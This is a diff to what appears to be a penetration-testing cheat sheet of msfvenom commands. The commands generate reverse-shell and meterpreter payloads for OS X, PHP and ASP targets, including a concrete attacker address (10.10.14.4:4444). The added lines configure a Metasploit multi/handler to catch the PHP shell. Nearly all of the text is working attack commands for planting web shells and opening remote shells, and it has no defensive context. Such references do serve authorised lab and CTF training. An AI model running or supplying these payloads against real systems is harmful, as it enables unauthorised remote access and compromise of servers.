@@ -31,6 +31,11 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port t
 msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > /tmp/shell.php && sed -i 's/#<?php/<?php/' /tmp/shell.php
  msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f raw -o shell.php
 > If you use php/reverse_php open the output file with an editor and add `<?php` and `?>` within the script.
+use exploit/multi/handler 
+set LHOST <$LOCAL_IP>
+set LPORT <$LOCAL_PORT>
+set PAYLOAD php/meterpreter/reverse_tcp 
+exploit
     
 ## ASP 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp 
